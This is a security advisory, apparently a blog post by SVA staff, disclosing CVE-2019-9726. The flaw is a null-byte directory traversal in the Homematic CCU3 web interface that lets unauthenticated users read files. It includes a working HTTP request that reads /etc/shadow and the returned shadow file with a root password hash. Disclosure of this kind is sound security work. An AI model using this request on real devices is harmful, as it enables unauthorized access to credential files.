---
layout: post
title: "CVE-2019-9726: Directory Traversal / Arbitrary File Read in Homematic CCU3"
date:   2019-03-26 10:00:00
image:
      url: /assets/article_images/2016-05-30-inspec-cis-docker/cover.jpeg
video: false
comments: true
theme_color: 302F2D

author: 'Patrick Münch'

author_image: "https://avatars0.githubusercontent.com/u/7220740?s=400"
author_link: "https://twitter.com/atomiczero111"
---

# Overview

- Vendor: eQ-3 AG
- Product: Homematic CCU3
- Version: 3.43.15
- Vulnerability: Arbitrary File Read

# Background

HomeMatic is a home automation system consisting of various components for automating several parts of a building, including different sensors and actuators. The HomeMatic CCU3 is a central control unit, which is responsible for integrating these components with each other.

From the vendor's website:
"The Central Control Unit CCU3 is the central element for local control of the Homematic IP smart home system. It represents the next generation of our proven Homematic Central Control Units CCU1 and CCU2. Operation via the Central Control Unit CCU3 can be used alternatively to the Homematic IP Access Point. While the Access Point establishes the connection to the free Homematic IP cloud and enables operation of the smart home system via a smartphone app, the Central Control Unit CCU3 works locally via a browser-based web interface (WebUI). Thanks to local configuration and operation as well as the option to create direct device connections, reliable and fail-proof operation of the smart home system is guaranteed at all times – even in the event of Internet failures."

# Issue Description

While analyzing the implementation of the CCU3's web interface, a Directory Traversal vulnerabilities has been identified, which can be exploited in order to read files from the CCU3's filesystem. This vulnerability can be exploited by unauthenticated attackers with access to the web interface. The vulnerability exist because of erroneous handling of Nullbytes. The following URLs are proofed to be vulnerable:

- http://1.1.1.1/.%00./.%00./tmp/event/subscriber.list
- http://1.1.1.1/.%00./.%00./etc/shadow

The following HTTP request illustrates the attack:

~~~ http
GET /.%00./.%00./etc/shadow HTTP/1.1
Host: 1.1.1.1
User-Agent: curl/7.64.0
Accept: */*
~~~

Response of the Homematic CCU3:

~~~
root:$1$FgzlpeV5$8cHtTwR1K5UkDHyNDlmo51:17640:0:99999:7:::
daemon:*:10933:0:99999:7:::
bin:*:10933:0:99999:7:::
sys:*:10933:0:99999:7:::
sync:*:10933:0:99999:7:::
mail:*:10933:0:99999:7:::
www-data:*:10933:0:99999:7:::
halt:*:10933:0:99999:7:::
uucp:*:10933:0:99999:7:::
operator:*:10933:0:99999:7:::
ftp:*:10933:0:99999:7:::
nobody:*:10933:0:99999:7:::
_ntp:*:::::::
sshd:*:::::::
~~~

# CVE

[CVE-2019-9726](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9726)

# CVSSv3 Base Score

CVSS Base Score: __7.5__

CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

# Credit

Pascal Keul of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

Patrick Muench of [SVA System Vertrieb Alexander GmbH](https://www.sva.de)

# Disclaimer

The information provided is released "as is" without warranty of any kind. The publisher disclaims all warranties, either express or implied, including all warranties of merchantability. No responsibility is taken for the correctness of this information. In no event shall the publisher be liable for any damages whatsoever including direct, indirect, incidental, consequential, loss of business profits or special damages, even if the publisher has been advised of the possibility of such damages.

The contents of this advisory are copyright (c) 2019 SVA System Vertrieb Alexander GmbH and may be distributed freely provided that no fee is charged for this distribution and proper credit is given.
